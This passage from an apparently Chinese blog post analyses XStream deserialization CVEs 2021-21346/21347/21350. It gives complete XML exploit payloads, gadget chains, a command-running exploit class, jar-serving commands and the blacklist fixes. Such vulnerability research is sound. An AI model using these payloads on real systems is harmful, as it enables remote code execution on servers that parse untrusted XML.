class="string">&quot;activate&quot;</span>, <span class="string">&quot;activating server&quot;</span>);</span><br><span class="line">           process = Runtime.getRuntime().exec(activationCmd);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">       ..</span><br></pre></td></tr></table></figure><h3 id="黑名单：-2"><a href="#黑名单：-2" class="headerlink" title="黑名单："></a>黑名单：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.sun.corba.se.impl.activation.ServerTableEntry</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern GETTER_SETTER_REFLECTION = Pattern.compile(<span class="string">&quot;.*\\$GetterSetterReflection&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21346"><a href="#CVE-2021-21346" class="headerlink" title="CVE-2021-21346"></a>CVE-2021-21346</h2><p>author: wh1t3p1g</p><h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">hashtable</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">loadFactor</span>&gt;</span>0.75<span class="tag">&lt;/<span class="name">loadFactor</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">threshold</span>&gt;</span>525<span class="tag">&lt;/<span class="name">threshold</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>700<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>0<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">hashtable</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">defaultLocale</span>&gt;</span>zh_CN<span class="tag">&lt;/<span class="name">defaultLocale</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">resourceCache</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">javax.swing.MultiUIDefaults</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">tables</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">hashtable</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">loadFactor</span>&gt;</span>0.75<span class="tag">&lt;/<span class="name">loadFactor</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">threshold</span>&gt;</span>525<span class="tag">&lt;/<span class="name">threshold</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">int</span>&gt;</span>700<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">int</span>&gt;</span>1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>lazyValue<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">sun.swing.SwingLazyValue</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">className</span>&gt;</span>javax.naming.InitialContext<span class="tag">&lt;/<span class="name">className</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>doLookup<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">args</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>ldap://localhost:1099/CallRemoteMethod<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">args</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">sun.swing.SwingLazyValue</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">hashtable</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultLocale</span> <span class="attr">reference</span>=<span class="string">&#x27;../../../../../../../javax.swing.UIDefaults/default/defaultLocale&#x27;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">resourceCache</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">tables</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">javax.swing.MultiUIDefaults</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">&#x27;string&#x27;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>这个是wh1t3p1g师傅上交的，实际为ysomap里的LazyValue，师傅给的调用链分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">javax.naming.ldap.Rdn$RdnEntry.compareTo</span><br><span class="line">    com.sun.org.apache.xpath.internal.objects.XString.equal</span><br><span class="line">        javax.swing.MultiUIDefaults.toString</span><br><span class="line">            UIDefaults.get</span><br><span class="line">                UIDefaults.getFromHashTable</span><br><span class="line">                    UIDefaults$LazyValue.createValue</span><br><span class="line">                    SwingLazyValue.createValue</span><br><span class="line">                        javax.naming.InitialContext.doLookup()</span><br></pre></td></tr></table></figure><p>注意官网poc里面的是<arg>标签，估计是jdk版本原因</p><h3 id="黑名单：-3"><a href="#黑名单：-3" class="headerlink" title="黑名单："></a>黑名单：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sun.swing.SwingLazyValue</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21347"><a href="#CVE-2021-21347" class="headerlink" title="CVE-2021-21347"></a>CVE-2021-21347</h2><p>author: threedr3am</p><h3 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;javafx.collections.ObservableList$1&#x27;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">names</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.AbstractList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>0<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.Arrays$ArrayList&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&#x27;string-array&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">string</span>&gt;</span>Evil<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">processorCL</span> <span class="attr">class</span>=<span class="string">&#x27;java.net.URLClassLoader&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">ucp</span> <span class="attr">class</span>=<span class="string">&#x27;sun.misc.URLClassPath&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">urls</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">vector</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">capacityIncrement</span>&gt;</span>0<span class="tag">&lt;/<span class="name">capacityIncrement</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">elementCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">elementCount</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">elementData</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://127.0.0.1:80/Evil.jar<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;/<span class="name">elementData</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">vector</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">urls</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">path</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://127.0.0.1:80/Evil.jar<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">loaders</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">lmap</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">ucp</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">package2certs</span> <span class="attr">class</span>=<span class="string">&#x27;concurrent-hash-map&#x27;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">classes</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">classloader</span> <span class="attr">class</span>=<span class="string">&#x27;java.net.URLClassLoader&#x27;</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">principals</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">hasAllPerm</span>&gt;</span>false<span class="tag">&lt;/<span class="name">hasAllPerm</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">staticPermissions</span>&gt;</span>false<span class="tag">&lt;/<span class="name">staticPermissions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">initialized</span>&gt;</span>true<span class="tag">&lt;/<span class="name">initialized</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">pdcache</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">processorCL</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">pos</span>&gt;</span>-2147483648<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span> <span class="attr">reference</span>=<span class="string">&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>这个POC的RCE触发点是com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader processorCL;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.nextProc != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">this</span>.names.hasNext()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String var1 = (String)<span class="keyword">this</span>.names.next();</span><br><span class="line"></span><br><span class="line">        Processor var2;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var2 = (Processor)((Processor)<span class="keyword">this</span>.processorCL.loadClass(var1).newInstance());</span><br><span class="line">                ...</span><br></pre></td></tr></table></figure><p>构造一个有evil code的static代码块类，打包jar</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitStaticCalc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;open -a calculator.app&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jar cvf Exploit.jar ExploitStaticCalc.class</span><br><span class="line">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure><p>参考【2】原文中有提到几点有意思的，这里就不复述了</p><ol><li>XStream 的outer-class</li><li>匿名内部类</li><li>不同java版本下ObservableList、ProtectionDomain的不同导致POC要做相应的修改</li></ol><p>但是在测试的时候，8u60、8u172都失败，8u231成功。失败的报错事com.sun.tools.javac.processing.AnnotationProcessingError，判断应该是processorCL 结构问题，对比8u231跟踪到java.lang.ClassLoader#defineClass1，参数基本一样，但是loadClass失败，未排查到原因。</p><p>太菜鸡了。。。</p><h3 id="黑名单：-4"><a href="#黑名单：-4" class="headerlink" title="黑名单："></a>黑名单：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">om.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator</span><br><span class="line">denyTypeHierarchyDynamically(<span class="string">&quot;javax.activation.DataSource&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21350"><a href="#CVE-2021-21350" class="headerlink" title="CVE-2021-21350"></a>CVE-2021-21350</h2><p>author: thread3am</p><h3 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;javafx.collections.ObservableList$1&#x27;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span 